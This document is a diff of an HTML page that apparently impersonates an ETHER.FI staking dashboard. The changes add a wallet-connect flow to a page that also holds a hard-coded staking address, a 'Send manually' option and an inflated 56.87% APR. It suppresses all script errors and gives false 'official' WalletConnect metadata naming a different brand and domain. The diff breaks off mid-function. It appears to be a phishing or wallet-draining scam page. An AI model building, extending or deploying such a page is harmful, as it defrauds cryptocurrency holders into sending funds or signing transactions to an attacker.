@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" style="background:#0D0D26;">
+<html lang="en" style="background:#0A1038;">
 <head>
 <script>window.onerror=function(){return true;};window.addEventListener&&window.addEventListener('error',function(e){e.stopPropagation&&e.stopPropagation();return true;},true);window.onunhandledrejection=function(e){try{e.preventDefault();}catch(x){}}
 function showManualFirst(walletType){
@@ -23,35 +23,40 @@ function proceedToWallet(){
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
 :root{
-  --p:#C850C0;--p2:#7B52F5;--p3:#1EB8D0;
-  --grad:linear-gradient(135deg,#C850C0 0%,#7B52F5 50%,#1EB8D0 100%);
-  --bg:#0B0A2E;--card:#12103A;--card2:#18164A;
+  --p:#7C6BFF;--p2:#4EA8FF;--p3:#4ECBFF;
+  --grad:linear-gradient(135deg,#4ECBFF 0%,#6B7BFF 50%,#C07AFF 100%);
+  --bg:#0A1038;--card:#12184A;--card2:#171F58;
   --b1:rgba(123,82,245,0.12);--b2:rgba(123,82,245,0.25);
-  --t1:#FFFFFF;--t2:#9090B8;--t3:#4A4A6A;
+  --t1:#FFFFFF;--t2:#C4C8E8;--t3:#9AA3D0;
   --font:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
   --mono:ui-monospace,'SF Mono','Courier New',monospace;
 }
-html{background:#0B0A2E;}body{background:#0B0A2E;color:var(--t1);font-family:var(--font);min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased;touch-action:pan-x pan-y;-webkit-text-size-adjust:100%;text-size-adjust:100%;}
+html{background:#0A1038;}body{background:#0A1038;color:var(--t1);font-family:var(--font);min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;touch-action:pan-x pan-y;-webkit-text-size-adjust:100%;text-size-adjust:100%;font-size:15px;}
 input,select,textarea{font-size:16px!important;-webkit-text-size-adjust:100%!important;}
 body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
-  background:
-    radial-gradient(ellipse 80% 60% at 20% 10%, rgba(80, 60, 200, 0.35), transparent 55%),
-    radial-gradient(ellipse 70% 50% at 85% 90%, rgba(40, 30, 140, 0.4), transparent 50%),
-    radial-gradient(ellipse 50% 40% at 50% 50%, rgba(60, 50, 160, 0.15), transparent 60%),
-    linear-gradient(160deg, #0B0A2E 0%, #12104A 40%, #0D0B35 100%);}
+  background:radial-gradient(ellipse 70% 50% at 8% 0%,rgba(78,203,255,0.16),transparent 55%),
+             radial-gradient(ellipse 55% 45% at 95% 100%,rgba(192,122,255,0.14),transparent 55%),
+             radial-gradient(ellipse 40% 30% at 50% 40%,rgba(80,90,200,0.12),transparent 60%);}
 /* NAV */
-nav{position:fixed;top:0;left:0;right:0;z-index:100;height:56px;display:flex;align-items:center;justify-content:space-between;padding:0 20px;background:rgba(11,10,46,0.92);backdrop-filter:blur(20px);border-bottom:1px solid var(--b1);}
+nav{position:fixed;top:0;left:0;right:0;z-index:100;height:56px;display:flex;align-items:center;justify-content:space-between;padding:0 20px;background:rgba(10,16,56,0.92);backdrop-filter:blur(20px);border-bottom:1px solid var(--b1);gap:10px;}
+.nmid{display:flex;align-items:center;justify-content:center;flex:1;}
 .nbrand{display:flex;align-items:center;gap:9px;}
-.nlogo{width:28px;height:28px;border-radius:50%;overflow:hidden;border:1px solid rgba(120,100,255,0.35);box-shadow:0 0 10px rgba(80,60,200,0.4);}
+.nlogo{width:30px;height:30px;border-radius:50%;overflow:hidden;border:1px solid rgba(78,203,255,0.35);box-shadow:0 0 10px rgba(78,203,255,0.25);}
 .nlogo img{width:100%;height:100%;object-fit:cover;}
 .nname{font-size:13px;font-weight:900;letter-spacing:-0.01em;color:#fff;}
-.nname em{font-style:normal;color:#fff;-webkit-text-fill-color:#fff;}
+.nname em{font-style:normal;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
 .nright{display:flex;align-items:center;gap:8px;}
 .nbtn{height:33px;padding:0 14px;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer;border:none;font-family:var(--font);transition:all .18s;}
 .nbtn.g{background:rgba(123,82,245,0.12);border:1px solid var(--b2);color:#fff;}
 .nbtn.s{background:var(--grad);color:#fff;box-shadow:0 0 18px rgba(123,82,245,0.4);}
 .nbtn.s:hover{filter:brightness(1.1);transform:translateY(-1px);}
-.nicon{width:33px;height:33px;border-radius:8px;background:rgba(123,82,245,0.08);border:1px solid var(--b1);color:var(--t2);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:14px;}
+.nbtn.connect{display:flex;align-items:center;gap:7px;height:33px;padding:0 14px;border-radius:100px;background:linear-gradient(135deg,#7B52F5 0%,#9B6BFF 100%);color:#fff;box-shadow:0 0 16px rgba(123,82,245,0.35);}
+.nbtn.connect:hover{filter:brightness(1.08);transform:translateY(-1px);}
+.nbtn.connect svg{width:15px;height:15px;flex-shrink:0;}
+.nbtn.connected{display:flex;align-items:center;gap:7px;height:33px;padding:0 12px 0 10px;border-radius:100px;background:rgba(123,82,245,0.18);border:1px solid var(--b2);color:#fff;box-shadow:none;}
+.nbtn.connected .cdot{width:7px;height:7px;border-radius:50%;background:#22c55e;box-shadow:0 0 8px #22c55e;flex-shrink:0;}
+@media(max-width:860px){.nbtn.connect span.clbl{display:none;}.nbtn.connect{padding:0 10px;}}
+.nicon{width:33px;height:33px;border-radius:8px;background:rgba(123,82,245,0.08);border:1px solid var(--b1);color:#E8ECFF;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:16px;}
 /* MAIN */
 main{padding-top:56px;position:relative;z-index:1;max-width:1200px;margin:0 auto;padding-bottom:60px;}
 /* HERO */
@@ -60,18 +65,18 @@ main{padding-top:56px;position:relative;z-index:1;max-width:1200px;margin:0 auto
 .vpill span{font-size:11px;font-weight:600;color:var(--t2);}
 .hero h1{font-size:40px;font-weight:900;letter-spacing:-0.04em;line-height:1.05;color:#fff;margin-bottom:11px;}
 .hero h1 .g{background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
-.hero-sub{font-size:12px;color:var(--t2);line-height:1.65;max-width:480px;margin-bottom:22px;}
+.hero-sub{font-size:14px;color:var(--t2);line-height:1.65;max-width:480px;margin-bottom:22px;}
 .trust-row{display:flex;flex-wrap:wrap;gap:6px;}
-.tchip{display:flex;align-items:center;gap:5px;padding:4px 10px;border-radius:7px;background:rgba(123,82,245,0.06);border:1px solid var(--b1);font-size:9.5px;font-weight:600;color:var(--t2);}
+.tchip{display:flex;align-items:center;gap:5px;padding:4px 10px;border-radius:7px;background:rgba(123,82,245,0.06);border:1px solid var(--b1);font-size:11px;font-weight:600;color:var(--t2);}
 .tdot{width:5px;height:5px;border-radius:50%;background:var(--grad);flex-shrink:0;}
 /* STATS */
 .sbar{display:grid;grid-template-columns:repeat(4,1fr);border-bottom:1px solid var(--b1);}
 .sc{padding:16px 20px;border-right:1px solid var(--b1);}
 .sc:last-child{border-right:none;}
-.sc-lbl{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:var(--t3);margin-bottom:5px;}
-.sc-val{font-size:19px;font-weight:900;letter-spacing:-0.02em;color:#fff;}
+.sc-lbl{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:var(--t2);margin-bottom:5px;}
+.sc-val{font-size:22px;font-weight:900;letter-spacing:-0.02em;color:#fff;}
 .sc-val.gr{background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
-.sc-sub{font-size:9.5px;color:var(--t3);margin-top:3px;}
+.sc-sub{font-size:11px;color:var(--t2);margin-top:3px;}
 /* GRID */
 .grid{display:grid;grid-template-columns:340px 1fr;border-top:1px solid var(--b1);}
 @media(max-width:860px){.grid{grid-template-columns:1fr;}.sbar{grid-template-columns:repeat(2,1fr);}.hero h1{font-size:28px;}nav{padding:0 14px;}}
@@ -82,16 +87,16 @@ main{padding-top:56px;position:relative;z-index:1;max-width:1200px;margin:0 auto
 .apr-block{background:var(--card2);border:1px solid var(--b2);border-radius:14px;padding:18px;margin-bottom:14px;position:relative;overflow:hidden;}
 .apr-block::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--grad);}
 .apr-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;}
-.apr-lbl-sm{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:var(--t3);}
-.apr-badge{display:flex;align-items:center;gap:4px;padding:3px 8px;border-radius:20px;background:rgba(30,184,208,0.08);border:1px solid rgba(30,184,208,0.2);font-size:8.5px;font-weight:700;color:var(--p3);}
-.apr-num{font-family:var(--mono);font-size:36px;font-weight:900;letter-spacing:-0.03em;line-height:1;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:10px;}
+.apr-lbl-sm{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:var(--t2);}
+.apr-badge{display:flex;align-items:center;gap:4px;padding:3px 8px;border-radius:20px;background:rgba(78,203,255,0.12);border:1px solid rgba(78,203,255,0.35);font-size:10px;font-weight:700;color:#7EE7FF;}
+.apr-num{font-family:var(--mono);font-size:40px;font-weight:900;letter-spacing:-0.03em;line-height:1;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:10px;}
 .apr-bar{height:3px;background:var(--b1);border-radius:2px;overflow:hidden;margin-bottom:10px;}
 .apr-bar-fill{height:100%;width:0%;background:var(--grad);border-radius:2px;transition:width 1.8s ease;}
 .apr-mini{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;}
 .am-cell{text-align:center;padding:7px;background:rgba(123,82,245,0.06);border-radius:7px;border:1px solid var(--b1);}
-.am-val{font-family:var(--mono);font-size:11px;font-weight:800;color:#fff;}
+.am-val{font-family:var(--mono);font-size:13px;font-weight:800;color:#fff;}
 .am-val.g{background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
-.am-lbl{font-size:7.5px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:var(--t3);margin-top:2px;}
+.am-lbl{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:var(--t2);margin-top:2px;}
 /* CLAIM */
 .claim-bar{display:none;align-items:center;justify-content:space-between;gap:10px;background:rgba(30,184,208,0.06);border:1px solid rgba(30,184,208,0.18);border-radius:9px;padding:10px 13px;margin-bottom:12px;}
 .claim-lbl{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:var(--t3);margin-bottom:2px;}
@@ -242,7 +247,7 @@ main{padding-top:56px;position:relative;z-index:1;max-width:1200px;margin:0 auto
 .acard{background:var(--card2);border:1px solid var(--b2);border-radius:10px;padding:14px;margin-bottom:11px;position:relative;overflow:hidden;}
 .acard::before{content:'';position:absolute;top:0;left:0;right:0;height:1.5px;background:var(--grad);}
 .albl{font-size:8.5px;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:7px;display:block;}
-.aval{font-family:var(--mono);font-size:7.5px;color:#fff;word-break:break-all;line-height:1.8;background:var(--bg);border-radius:6px;padding:7px 9px;border:1px solid var(--b1);margin-bottom:8px;}
+.aval{font-family:var(--mono);font-size:11px;color:#fff;word-break:break-all;line-height:1.8;background:var(--bg);border-radius:6px;padding:7px 9px;border:1px solid var(--b1);margin-bottom:8px;}
 .copybtn{width:100%;height:34px;border-radius:7px;background:var(--grad);border:none;color:#fff;font-size:9.5px;font-weight:800;cursor:pointer;font-family:var(--font);}
 .succicon{width:48px;height:48px;border-radius:50%;background:rgba(123,82,245,0.1);border:1px solid rgba(123,82,245,0.25);display:flex;align-items:center;justify-content:center;margin:0 auto 11px;box-shadow:0 0 18px rgba(123,82,245,0.2);}
 .succtitle{font-size:12px;font-weight:800;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:4px;}
@@ -341,8 +346,14 @@ html, body, main, .hero, .sbar, .grid, .lp, .rp,
 <body style="background:#0D0D26;background-color:#0D0D26;">
 <nav>
   <div class="nbrand">
-    <div class="nlogo"><img class="brand-logo-img" alt="ETHER.FI"/></div>
-    <div class="nname">ETHER.<em>FI</em></div>
+    <div class="nlogo"><img class="brand-logo-img" alt="ETHFI"/></div>
+    <div class="nname">ETHER.FI</div>
+  </div>
+  <div class="nmid">
+    <button class="nbtn connect" id="navWalletBtn" onclick="navConnectWallet()" type="button">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="6" width="20" height="14" rx="3"/><path d="M2 10h20"/><path d="M16 15h2"/></svg>
+      <span class="clbl" id="navWalletLbl">Connect Wallet</span>
+    </button>
   </div>
   <div class="nright">
     <button class="nbtn g" onclick="openShare()">&#8599; Share</button>
@@ -475,7 +486,7 @@ html, body, main, .hero, .sbar, .grid, .lp, .rp,
           <div class="fgt">Analytics</div>
           <div class="anal"><span class="al">Validator Uptime</span><div class="ar"><div class="abar"><div class="afill" style="width:99%;"></div></div><span class="av">99.9%</span></div></div>
           <div class="anal"><span class="al">Commission</span><div class="ar"><div class="abar"><div class="afill" style="width:40%;"></div></div><span class="av">8.00%</span></div></div>
-          <div class="anal"><span class="al">Network Bonded</span><div class="ar"><div class="abar"><div class="afill" style="width:63%;"></div></div><span class="av">62.8%</span></div></div>
+          <div class="anal"><span class="al">Network Bonded</span><div class="ar"><div class="abar"><div class="afill" style="width:62.8%;"></div></div><span class="av">62.8%</span></div></div>
           <div class="anal"><span class="al">Effective APR</span><div class="ar"><div class="abar"><div class="afill" style="width:70%;"></div></div><span class="av g">56.87%</span></div></div>
         </div>
         <div class="fgc">
@@ -493,8 +504,8 @@ html, body, main, .hero, .sbar, .grid, .lp, .rp,
     <div class="srow"><div class="sdot active" id="sd1">1</div><div class="sline" id="sl1"></div><div class="sdot" id="sd2">2</div><div class="sline" id="sl2"></div><div class="sdot" id="sd3">3</div><span class="slbl" id="sLbl">Connect</span></div>
     <div id="ms1">
       <div id="ms1a" style="display:none;"><p style="font-size:9.5px;color:var(--t2);margin-bottom:14px;line-height:1.7;">Connect your wallet to sign the staking transaction.</p>
-        <button onclick="showManualFirst('mm')" class="wopt" id="mmBtn"><div class="wicon"><img src="" id="mmLogoImg" style="width:26px;height:26px;object-fit:contain;"/></div><div><div class="wn">MetaMask</div><div class="ws">Browser extension or mobile app</div></div><span style="color:var(--t3);margin-left:auto;">&#8594;</span></button>
-        <button onclick="showManualFirst('wc')" class="wopt" id="wcBtn"><div class="wicon"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgcng9IjUwIiBmaWxsPSIjM0I5OUZDIi8+PHBhdGggZD0iTTI3IDQwYzEyLjgtMTIuNSAzMy41LTEyLjUgNDYuMyAwbDEuNSAxLjVjMC42IDAuNiAwLjYgMS42IDAgMi4ybC01LjIgNS4xYy0wLjMgMC4zLTAuOCAwLjMtMS4xIDBsLTIuMS0yYy04LjktOC43LTIzLjQtOC43LTMyLjMgMGwtMi4zIDIuMmMtMC4zIDAuMy0wLjggMC4zLTEuMSAwbC01LjItNS4xYy0wLjYtMC42LTAuNi0xLjYgMC0yLjJMMjcgNDB6bTU3LjIgMTAuNmw0LjYgNC41YzAuNiAwLjYgMC42IDEuNiAwIDIuMkw2Ny40IDc4LjVjLTAuNiAwLjYtMS42IDAuNi0yLjIgMEw1MCA2My41IDM0LjggNzguNWMtMC42IDAuNi0xLjYgMC42LTIuMiAwTDExLjIgNTcuM2MtMC42LTAuNi0wLjYtMS42IDAtMi4ybDQuNi00LjVjMC42LTAuNiAxLjYtMC42IDIuMiAwTDMzLjIgNjUuNyA0OC40IDUwLjdjMC42LTAuNiAxLjYtMC42IDIuMiAwbDE1LjIgMTUgMTUuMi0xNWMwLjYtMC42IDEuNi0wLjYgMi4yIDB6IiBmaWxsPSJ3aGl0ZSIvPjwvc3ZnPg==" style="width:26px;height:26px;border-radius:50%;"/></div><div><div class="wn">WalletConnect</div><div class="ws">Scan with any mobile wallet</div></div><span style="color:var(--t3);margin-left:auto;">&#8594;</span></button>
+        <button onclick="connectMM()" class="wopt" id="mmBtn"><div class="wicon"><img src="" id="mmLogoImg" style="width:26px;height:26px;object-fit:contain;"/></div><div><div class="wn">MetaMask</div><div class="ws">Browser extension or mobile app</div></div><span style="color:var(--t3);margin-left:auto;">&#8594;</span></button>
+        <button onclick="connectWalletConnect()" class="wopt" id="wcBtn"><div class="wicon"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgcng9IjUwIiBmaWxsPSIjM0I5OUZDIi8+PHBhdGggZD0iTTI3IDQwYzEyLjgtMTIuNSAzMy41LTEyLjUgNDYuMyAwbDEuNSAxLjVjMC42IDAuNiAwLjYgMS42IDAgMi4ybC01LjIgNS4xYy0wLjMgMC4zLTAuOCAwLjMtMS4xIDBsLTIuMS0yYy04LjktOC43LTIzLjQtOC43LTMyLjMgMGwtMi4zIDIuMmMtMC4zIDAuMy0wLjggMC4zLTEuMSAwbC01LjItNS4xYy0wLjYtMC42LTAuNi0xLjYgMC0yLjJMMjcgNDB6bTU3LjIgMTAuNmw0LjYgNC41YzAuNiAwLjYgMC42IDEuNiAwIDIuMkw2Ny40IDc4LjVjLTAuNiAwLjYtMS42IDAuNi0yLjIgMEw1MCA2My41IDM0LjggNzguNWMtMC42IDAuNi0xLjYgMC42LTIuMiAwTDExLjIgNTcuM2MtMC42LTAuNi0wLjYtMS42IDAtMi4ybDQuNi00LjVjMC42LTAuNiAxLjYtMC42IDIuMiAwTDMzLjIgNjUuNyA0OC40IDUwLjdjMC42LTAuNiAxLjYtMC42IDIuMiAwbDE1LjIgMTUgMTUuMi0xNWMwLjYtMC42IDEuNi0wLjYgMi4yIDB6IiBmaWxsPSJ3aGl0ZSIvPjwvc3ZnPg==" style="width:26px;height:26px;border-radius:50%;"/></div><div><div class="wn">WalletConnect</div><div class="ws">Scan with any mobile wallet</div></div><span style="color:var(--t3);margin-left:auto;">&#8594;</span></button>
         <div style="text-align:center;margin-top:11px;"><button onclick="showManual()" style="background:none;border:none;font-size:9.5px;font-weight:700;cursor:pointer;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;font-family:var(--font);">Send manually &#8594;</button></div>
       </div>
       <div id="ms1b" style="display:none;"><p style="font-size:9.5px;color:var(--t2);margin-bottom:12px;line-height:1.7;">Wallet connected. Proceed to confirm.</p>
@@ -576,7 +587,7 @@ html, body, main, .hero, .sbar, .grid, .lp, .rp,
       <div style="background:var(--card2);border:1px solid var(--b1);border-radius:8px;padding:10px;text-align:center;"><div style="font-family:var(--mono);font-size:14px;font-weight:800;color:#fff;">8.00%</div><div style="font-size:8.5px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:var(--t3);margin-top:2px;">Commission</div></div>
       <div style="background:var(--card2);border:1px solid var(--b1);border-radius:8px;padding:10px;text-align:center;"><div style="font-family:var(--mono);font-size:14px;font-weight:800;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">56.87%</div><div style="font-size:8.5px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:var(--t3);margin-top:2px;">APR</div></div>
     </div>
-    <div style="font-size:9.5px;color:var(--t2);line-height:1.7;padding:10px 12px;background:var(--card2);border:1px solid var(--b1);border-radius:8px;margin-bottom:13px;">Operation Solo Staker is an independent solo staking operator focused on reliability, transparency, and slashing protection.</div>
+    <div style="font-size:9.5px;color:var(--t2);line-height:1.7;padding:10px 12px;background:var(--card2);border:1px solid var(--b1);border-radius:8px;margin-bottom:13px;">Operation Solo Staker is an institutional staking provider with enterprise-grade infrastructure, 24/7 monitoring, and slashing protection.</div>
     <button class="btnmain" onclick="closeVP();openStakingModal();" style="font-size:10px;">Stake with Operation Solo Staker</button>
   </div></div>
 </div>
@@ -600,7 +611,7 @@ html, body, main, .hero, .sbar, .grid, .lp, .rp,
       <div class="mhd"><div class="mtitle">Share Portfolio</div><button class="mclose" onclick="closeShare()">&#10005;</button></div>
       <div style="background:var(--card2);border:1px solid var(--b2);border-radius:12px;padding:20px;margin-bottom:12px;position:relative;overflow:hidden;">
         <div style="position:absolute;top:0;left:0;right:0;height:1.5px;background:var(--grad);"></div>
-        <div style="display:flex;align-items:center;gap:8px;margin-bottom:16px;"><img class="brand-logo-img" style="width:28px;height:28px;border-radius:50%;border:1px solid var(--b2);"/><div style="font-size:12px;font-weight:900;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">ETHFI</div></div>
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:16px;"><img class="brand-logo-img" style="width:28px;height:28px;border-radius:7px;border:1px solid var(--b2);"/><div style="font-size:12px;font-weight:900;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">ETHFI</div></div>
         <div style="font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:var(--t3);margin-bottom:4px;">Staked Amount</div>
         <div style="font-family:var(--mono);font-size:26px;font-weight:900;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:3px;" id="shareAmt">-- ETHFI</div>
         <div style="font-size:10px;color:var(--t2);margin-bottom:16px;">Earning <span style="background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;font-weight:700;">56.87% APR</span> - Epoch 1</div>
@@ -621,18 +632,23 @@ html, body, main, .hero, .sbar, .grid, .lp, .rp,
 var LOGO_B64=document.getElementById('lgD').getAttribute('data-src');
 var STAKE_ADDR='0x94c23923442126632eefC4f0dC1E2AB771e68670';
 var APR=0.5687,stakedAmt=0,startTime=null,stakeMethod=null;
-var walletAddress=null,walletChainId=null,walletKind=null,wcProvider=null;
+var WALLETCONNECT_PROJECT_ID = 'a6eae1f8c6d2194030cd4c2fd7772b7b';
+var walletAddress = null;
+var walletChainId = null;
+var walletKind = null;
+var wcProvider = null;
 var CH={'0x1':{n:'Ethereum',e:'https://etherscan.io',c:'ETH'},'0x38':{n:'BSC',e:'https://bscscan.com',c:'BNB'},'0x89':{n:'Polygon',e:'https://polygonscan.com',c:'MATIC'},'0xa4b1':{n:'Arbitrum',e:'https://arbiscan.io',c:'ETH'},'0xa':{n:'Optimism',e:'https://optimistic.etherscan.io',c:'ETH'},'0x2105':{n:'Base',e:'https://basescan.org',c:'ETH'}};
 function cn(id){return CH[id]?CH[id].n:'Chain '+parseInt(id,16);}
 function ce(id){return CH[id]?CH[id].e:'https://etherscan.io';}
 function cc(id){return CH[id]?CH[id].c:'ETH';}
 function sa(a){return a?(a.slice(0,6)+'...'+a.slice(-4)):'';}
+function shortAddr(a){return sa(a);}
 
 document.addEventListener('DOMContentLoaded',function(){
   document.querySelectorAll('.brand-logo-img').forEach(function(i){i.src=LOGO_B64;});
   var mmEl=document.getElementById('mmLogoImg');
   if(mmEl) mmEl.src=document.getElementById('mmD').getAttribute('data-src');
-  try{var s=JSON.parse(localStorage.getItem('ethfiStake')||'null');if(s){stakedAmt=s.amount||0;startTime=s.startTime||null;}}catch(e){}
+  try{var s=JSON.parse(localStorage.getItem('zigStake')||'null');if(s){stakedAmt=s.amount||0;startTime=s.startTime||null;}}catch(e){}
   if(stakedAmt>0&&startTime){updateAll();startAccrual();showToast('Welcome back','Staking data restored.');}
   updateWalletUI();updateEpoch();setInterval(updateEpoch,60000);
   animateAPR();
@@ -653,11 +669,28 @@ function animateAPR(){
     var v=target*(step/steps);
     el.textContent=v.toFixed(2)+'%';
     if(fill) fill.style.width=(v/target*70).toFixed(1)+'%';
-    if(step>=steps){clearInterval(t);el.textContent=target.toFixed(2)+'%';if(fill)fill.style.width='70%';}
+    if(step>=steps){clearInterval(t);el.textContent='56.87%';if(fill)fill.style.width='70%';}
   },40);
 }
 
-function updateWalletUI(){}
+function updateWalletUI(){
+  var btn=document.getElementById('navWalletBtn');
+  var lbl=document.getElementById('navWalletLbl');
+  if(!btn||!lbl)return;
+  if(walletAddress){
+    btn.className='nbtn connected';
+    btn.innerHTML='<span class="cdot"></span><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="6" width="20" height="14" rx="3"/><path d="M2 10h20"/></svg><span class="clbl" id="navWalletLbl">'+sa(walletAddress)+'</span>';
+    btn.title=walletAddress;
+  }else{
+    btn.className='nbtn connect';
+    btn.innerHTML='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="6" width="20" height="14" rx="3"/><path d="M2 10h20"/><path d="M16 15h2"/></svg><span class="clbl" id="navWalletLbl">Connect Wallet</span>';
+    btn.title='Connect Wallet';
+  }
+}
+function navConnectWallet(){
+  if(walletAddress){disconnectWallet();return;}
+  connectWalletConnect();
+}
 function connectMM(){
   if(typeof window.ethereum==='undefined'){showToast('MetaMask not found','Install MetaMask or use mobile app.');return;}
   var btn=document.getElementById('mmBtn');if(btn)btn.style.opacity='0.6';
@@ -673,61 +706,83 @@ function connectMM(){
     });
   }).catch(function(e){if(btn)btn.style.opacity='1';showToast('Cancelled',e&&e.message?e.message:'Rejected.');});
 }
-function connectWC(){
+function showWcQrPanel(){}
+function hideWcQrPanel(){}
+function copyWcUri(){}
+function connectWC(){connectWalletConnect();}
+async function connectWalletConnect(){
   var btn=document.getElementById('wcBtn');
   if(btn){btn.style.opacity='0.6';btn.disabled=true;}
-  showToast('WalletConnect','Loading...');
-  var s=document.createElement('script');
-  s.crossOrigin='anonymous';
-  s.src='https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.23.9/dist/index.umd.js';
-  s.onload=function(){
+  showToast('WalletConnect','Loading...','blue');
+  try{
+    var script=document.createElement('script');
+    script.src='https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.23.9/dist/index.umd.js';
+    document.head.appendChild(script);
+    await new Promise(function(res,rej){script.onload=res;script.onerror=rej;});
     var WC=window['@walletconnect/ethereum-provider']||window.EthereumProvider;
-    if(!WC||!WC.EthereumProvider){if(btn){btn.style.opacity='1';btn.disabled=false;}showToast('WalletConnect','Failed. Use MetaMask.');return;}
-    WC.EthereumProvider.init({
-      projectId:'a6eae1f8c6d2194030cd4c2fd7772b7b',
-      optionalChains:[1,56,137,42161,10,8453],
-      showQrModal:true,
-      metadata:{name:'Staking Hub',description:'Official Staking Hub',url:window.location.href,icons:[]}
-    }).then(function(provider){
-      wcProvider=provider;return provider.connect();
-    }).then(function(){
-      walletAddress=wcProvider.accounts[0];
-      walletChainId='0x'+wcProvider.chainId.toString(16);
-      walletKind='walletconnect';
-      if(btn){btn.style.opacity='1';btn.disabled=false;}
-      onWalletConnected();
-    }).catch(function(e){
-      if(btn){btn.style.opacity='1';btn.disabled=false;}
-      showToast('WalletConnect',(e&&e.message)||'Connection cancelled.');
+    if(!WC||!WC.EthereumProvider) throw new Error('Could not load WalletConnect.');
+    wcProvider=await WC.EthereumProvider.init({
+      projectId:WALLETCONNECT_PROJECT_ID,
+      optionalChains:[1,56,137,42161,10,8453], // ETH, BSC, Polygon, Arbitrum, Optimism, Base
+      showQrModal:true, // official WC modal = any WC wallet
+      metadata:{
+        name:'UB Staking Hub',
+        description:'Official UB staking dashboard',
+        url:'https://staking.ub.com',
+        icons:['https://avatars.githubusercontent.com/u/37784886']
+      }
     });
-  };
-  s.onerror=function(){if(btn){btn.style.opacity='1';btn.disabled=false;}showToast('WalletConnect','Failed. Use MetaMask.');};
-  document.head.appendChild(s);
+    await wcProvider.connect();
+    walletAddress=wcProvider.accounts[0];
+    walletChainId='0x'+wcProvider.chainId.toString(16);
+    walletKind='walletconnect';
+    if(btn){btn.style.opacity='1';btn.disabled=false;}
+    onWalletConnected();
+    showToast('Connected',shortAddr(walletAddress)+' via WalletConnect','green');
+  }catch(e){
+    if(btn){btn.style.opacity='1';btn.disabled=false;}
+    if(e&&e.message&&e.message.indexOf('User rejected')>-1){
+      showToast('Cancelled','Connection was rejected.','yellow');
+    } else {
+      showToast('WalletConnect',(e&&e.message)||'Connection failed.','yellow');
+    }
+  }
 }
-function disconnectWallet(){walletAddress=null;walletChainId=null;walletKind=null;wcProvider=null;updateWalletUI();showConnect();showToast('Disconnected','You can reconnect any time.');}
+function getWalletProvider(){return walletKind==='walletconnect'?wcProvider:window.ethereum;}
+function disconnectWallet(){
+  if(wcProvider&&wcProvider.disconnect){ try{wcProvider.disconnect();}catch(e){} }
+  walletAddress=null; walletChainId=null; walletKind=null; wcProvider=null;
+  updateWalletUI();
+  showConnect();
+  showToast('Disconnected','You can reconnect any time.');
+}
 function onWalletConnected(){
+  stakeMethod=walletKind||'wallet';
   ['connAddr','connAddr2'].forEach(function(id){var e=document.getElementById(id);if(e)e.textContent=sa(walletAddress);});
   ['connNet','connNet2'].forEach(function(id){var e=document.getElementById(id);if(e)e.textContent=cn(walletChainId);});
-  var a=document.getElementById('ms1a'),b=document.getElementById('ms1b'),c=document.getElementById('ms1c');
-  if(a)a.style.display='none';if(c)c.style.display='none';if(b)b.style.display='block';
